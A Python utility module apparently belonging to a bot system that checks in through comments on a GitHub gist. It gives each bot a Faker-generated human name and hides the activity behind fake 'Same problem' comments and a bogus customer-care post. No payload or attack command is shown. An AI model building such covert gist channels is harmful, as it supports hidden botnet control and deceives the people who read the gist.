import os
import string
from contextlib import contextmanager

from dotenv import load_dotenv
from faker import Faker
from github import Github, GistComment
from github.Gist import Gist

load_dotenv()

faker = Faker()
ACTIVITY_COMMENT = "Same problem, I'm "
NAME_FILE = ".n"

GIST_TEXT = "Do you have that specific problem, with this piece of software ? Let us know in comments, " \
            "and out customer care specialists will try to help you."

ITEMS_PER_PAGE = 30


def login() -> Github:
    gh_token = os.environ.get("gh-api-token")
    return Github(gh_token)


def get_gist_id() -> string:
    return os.environ.get("gist-id")


def create_random_name(used_names) -> string:
    print(f"Creating random name")
    for i in range(0, 10000):
        name = faker.name()
        if name not in used_names:
            break

    return name


def create_and_save_name(used_names) -> string:
    name = create_random_name(used_names)
    with open(NAME_FILE, "w+") as f:
        f.write(name)
    return name


def get_name(gist: Gist) -> string:
    with opened_w_error(NAME_FILE, "r") as (file, err):
        if err:
            name = create_and_save_name(get_all_bots_names(gist))
        else:
            name = file.read()
    if name.isspace() or name == "":
        name = create_and_save_name(get_all_bots_names(gist))

    return name


def get_last_comment(gist) -> GistComment:
    return gist.get_comments().reversed.get_page(gist.comments // ITEMS_PER_PAGE)[-1]


def get_all_comments(gist: Gist) -> [GistComment]:
    comments = []
    page = 0
    while True:
        curr_page_comments = gist.get_comments().get_page(page)
        if len(curr_page_comments) == 0:
            break

        [comments.append(com) for com in curr_page_comments]

        page += 1
    return comments


def get_filename_from_path(path: string) -> string:
    return os.path.basename(path)


def get_all_bots_names(gist: Gist) -> [string]:
    splice = len(ACTIVITY_COMMENT)
    comments = get_all_comments(gist)
    bots = list(map(lambda c: c.body[splice:], filter(lambda c: ACTIVITY_COMMENT in c.body, comments)))
    return bots


@contextmanager
def opened_w_error(filename, mode="r"):
    try:
        f = open(filename, mode)
    except IOError as err:
        yield None, err
    else:
        try:
            yield f, None
        finally:
            f.close()
